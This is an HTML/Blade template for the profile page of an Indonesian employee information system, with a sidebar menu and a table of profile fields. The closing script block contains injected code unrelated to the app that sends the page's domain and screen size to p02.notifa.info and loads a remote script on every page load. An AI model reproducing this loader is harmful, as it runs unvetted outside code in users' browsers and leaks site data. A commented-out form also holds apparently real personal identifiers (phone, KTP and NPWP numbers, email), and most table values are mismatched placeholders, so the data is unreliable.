<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="/image/favicon.png">
    <title>Profil</title>
    <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
    <link rel="stylesheet" href="assets/css/style.css" type="text/css"/>
    </head>
    <body>
    <div class="be-wrapper">
     <div class="be-wrapper be-fixed-sidebar">

            <!--  Sidebar Brand Logo -->

          <div class="be-left-sidebar">
            <div class="brand-logo">
                <img src="/image/logo.png">
            </div>

                 <!--  Sidebar Brand Logo End -->  

                  <!--  Sidebar Start -->  

            <div class="left-sidebar-wrapper"> <a href="#" class="left-sidebar-toggle">MENU</a>
             <div class="left-sidebar-spacer">
              <div class="left-sidebar-scroll">
                <div class="left-sidebar-content">

                     <!--  Sidebar Poto, Username, Edit Profil -->

                    <div class="profil">
                        <div class="circular--portrait">
                            <img class="img-responsive" src="assets/img/avatar.png">
                            <div id="username">
                                <a href="profil.html" class="simple_text">{{ Auth::user()->name }}</a>
                            </div>
                           <button onclick="window.location.href='/profil'" type="button" class="btn">Profil</button>
                           <!-- <button class="btn btn-space btn-default active">Default</button> -->
                        </div>

                             <!--  Sidebar Menu-->

                        <ul class="sidebar-elements">
                            <li class="divider">Menu
                                <hr class="Menu">  
                            </li>

                            <li class="active"><a href="/home">
                                <i class="icon fas fa-home"></i>
                                <span>Beranda</span></a>
                            </li>
                                                                     
                            <li class="active">
                                <a class="" href="/datakaryawan">
                                    <i class="icon far fa-address-book"></i>
                                    <span>Data Karyawan</span>
                                </a>
                            </li>

                            <li class="active">
                                <a class=" " href="/presensi">
                                  <i class="icon fas fa-calendar-alt"></i>
                                  <span>Presensi</span>
                              </a>
                            </li>

                              <li class="active">
                                <a class=" " href="/penggajian">
                                   <i class="icon fas fa-money-check-alt"></i>
                                    <span>Penggajian</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/persetujuan_izin">
                                   <i class="icon far fa-calendar-check"></i>
                                    <span>Persetujuan Izin</span>
                                </a>
                              </li>  

                              <li class="divider">Personal
                                 <hr class="Menu">  
                              </li> 

                              <li class="active">
                                <a class=" " href="/gaji">
                                  <i class="icon far fa-money-bill-alt"></i>
                                  <span>Gaji</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/kontak_karyawan">
                                    <i class="icon far fa-id-card"></i>
                                    <span>Kontak Karyawan</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/form_izin">
                                  <i class="icon fab fa-wpforms"></i>
                                  <span>Form Izin</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class="dropdown-item" href="{{ route('logout') }}"
                                       onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                        <i class="icon fas fa-sign-out-alt"></i>
                                        <span>Logout</span>
                                </a>

                                <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                                        @csrf
                                </form>
                              </li>                              
                            </ul>
                         </div>                         
                    </div>
                 </div>
               </div>
            </div>
         </div>
       </div>
    

       <!-- Konten -->
      <div class="be-content">
        <div class="page-head">
          <h2 class="page-head-title">Profil</h2>
        </div>
        <div class="main-content container-fluid">
          <div class="row">

           <!--Basic Elements-->
          <div class="row">
            <div class="col-md-12">
              <div class="panel panel-default panel-border-color-primary">
                <div class="panel-body">
                   <div class="editprofil">
                    <a href="/profil/{nik}/edit/data_pribadi">
                       <button type="button" class="btn btn-space btn-primary"> Edit Profil </button> </a>
                    </div>
                 <!--  <form action="#" style="border-radius: 0px;" class="form-horizontal group-border-dashed">
                    <div class="form-group">
                    <img alt="foto profil" src="assets/img/140x140.png" class="img-thumbnail" /> <br> <br>       
                </div>
             <div class="form-group">
              <label>NIK</label>
              <input type="number" placeholder="1234567098765432" class="form-control" disabled="" >
            </div>
             <div class="form-group">
              <label >Nama</label>
              <input type="text" placeholder="Adinda Virguinia Ayu Permata Manihuruk" class="form-control" disabled="">
            </div>
            <div class="form-group">
              <label>Email address</label>
              <input type="email" placeholder="adinda.14115036@student.itera.ac.id" class="form-control" disabled="" >
            </div>
             <div class="form-group">
              <label>Jabatan/Divisi</label>
              <input type="text" placeholder="Tech Development" class="form-control" disabled="" >
            </div>
            <div class="form-group">
              <label>Masa Kerja</label>
              <input type="text" placeholder="1 bulan 19 hari" class="form-control" disabled="" >              
            </div>
             <div class="form-group">
              <label>Alamat</label>
              <input type="text" placeholder="Jl.Pangeran Senopati Raya no 18, Korpri Raya, Bandar Lampung" class="form-control" disabled="" >
            </div>
             <div class="form-group">
              <label>Tempat Kelahiran</label>
              <input type="text" placeholder="Dili, Timor Leste" class="form-control" disabled="" >
            </div>
            <div class="row">              
                <label>Tanggal Lahir</label>
                <input type="number" placeholder="22/11/1997" class="form-control" disabled="">              
            </div>            
             <div class="form-group">
              <label>No.Telepon</label>
              <input type="number" placeholder="085267020933" class="form-control" disabled="">
            </div>
             <div class="form-group">
              <label>No.KTP</label>
              <input type="number" placeholder="8723487634567987645" class="form-control" disabled="">
            </div>
             <div class="form-group">
              <label>No.NPWP</label>
              <input type="number" placeholder="59867374587457" class="form-control" disabled="" >
            </div>
            <div class="form-group">
              <label>No.Telepon Darurat</label>
              <input type="number" placeholder="085267020922" class="form-control" disabled="">
            </div>
            <div class="form-group">
              <label>Nama Istri/Suami</label>
              <input type="text" placeholder="-" class="form-control" disabled="">              
            </div>
             <div class="form-group">
              <label>Nama Anak ke-1</label>
              <input type="text" placeholder="-" class="form-control" disabled="">              
            </div>
             <div class="form-group">
              <label>Nama Anak ke-2</label>
              <input type="text" placeholder="-" class="form-control" disabled="">              
            </div>
                  </form>
 -->

                  <div class="user-info-list panel panel-default">
                  <div class="panel-body">
                    <table class="no-border no-strip skills">
                      <tbody class="no-border-x no-border-y">
                         <img alt="foto profil" src="assets/img/140x140.png" class="img-thumbnail" /> <br> <br>
                          <tr>
                          <td class="icon"><span class="mdi mdi-card-sim"></span></td>
                          <td class="item">NIK<span class="icon s7-portfolio"></span></td>
                          <td>1234567890654323456</td>
                        </tr>
                        <tr>
                          <td class="icon"><span class="mdi mdi-account-circle"></span></td>
                          <td class="item">Nama<span class="icon s7-portfolio"></span></td>
                          <td>Adinda Virguinia Ayu Permata Manihuruk</td>
                        </tr>
                           <tr>
                          <td class="icon"><span class="mdi mdi-email"></span></td>
                          <td class="item">Alamat Email<span class="icon s7-portfolio"></span></td>
                          <td>Adinda Virguinia Ayu Permata Manihuruk</td>
                        </tr>
                        <tr>
                          <td class="icon"><span class="mdi mdi-case"></span></td>
                          <td class="item">Jabatan/Divisi<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-case"></span></td>
                          <td class="item">Masa Kerja<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-home"></span></td>
                          <td class="item">Alamat<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-my-location"></span></td>
                          <td class="item">Tempat Kelahiran<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-case"></span></td>
                          <td class="item">Tanggal Lahir<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-smartphone-iphone"></span></td>
                          <td class="item">Nomor Telepon<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-card-sim"></span></td>
                          <td class="item">Nomor KTP<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-card-sim"></span></td>
                          <td class="item">Nomor NPWP<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-smartphone-iphone"></span></td>
                          <td class="item">Nomor Telepon Darurat<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-case"></span></td>
                          <td class="item">Nama Istri atau Suami<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-case"></span></td>
                          <td class="item">Nama Anak ke-1<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                         <tr>
                          <td class="icon"><span class="mdi mdi-case"></span></td>
                          <td class="item">Nama Anak ke-2<span class="icon s7-portfolio"></span></td>
                          <td>Developer Engineer</td>
                        </tr>
                      </tbody>
                    </table >
                  </div>
                </div> 
                            

</div>
              </div>
            </div>
          </div>
          </div>
        </div>
      </div>      
        
       <!--   Content End  -->
       
<!--Footer -->
     
    <div class="text-center">
      <div class="credits">
        <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
      </div>
    </div>

 
<!--  Inisialisasi Java Script -->

<script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="assets/js/main.js" type="text/javascript"></script>
<script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="assets/lib/jquery-flot/jquery.flot.js" type="text/javascript"></script>
<script src="assets/lib/jquery-flot/jquery.flot.pie.js" type="text/javascript"></script> 
<script src="assets/lib/jquery-flot/jquery.flot.resize.js" type="text/javascript"></script>
<script src="assets/lib/jquery-flot/plugins/jquery.flot.orderBars.js" type="text/javascript"></script>
<script src="assets/lib/jquery-flot/plugins/curvedLines.js" type="text/javascript"></script>
<script src="assets/lib/jquery.sparkline/jquery.sparkline.min.js" type="text/javascript"></script>
<script src="assets/lib/countup/countUp.min.js" type="text/javascript"></script>
<script src="assets/lib/jquery-ui/jquery-ui.min.js" type="text/javascript"></script>
<script src="assets/lib/jqvmap/jquery.vmap.min.js" type="text/javascript"></script>
<script src="assets/lib/jqvmap/maps/jquery.vmap.world.js" type="text/javascript"></script>

I<!-- inisialisasi Java Script -->

<script type="text/javascript">
      document.getElementById("status").onchange = function () {
      document.getElementById("alasan").setAttribute("disabled", "disabled");
       document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
      if (this.value == 'Resign')
        document.getElementById("alasan").removeAttribute("disabled");
      if (this.value == 'Resign')
      document.getElementById("tgl_resign").removeAttribute("disabled");
      };

      // Fungsi Logout

      $(function(){
          $('a#logout').click(function(){
              if(confirm('Apakah anda yakin ingin keluar ?')) {
                  return true;
              }

              return false;
                });
            });


      // Fungsi Menu dashboard

      $(document).ready(function(){

          App.init();
          App.dashboard();

          });
      </script>

<script type = "text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };

</script>
</script>
</body>
</html>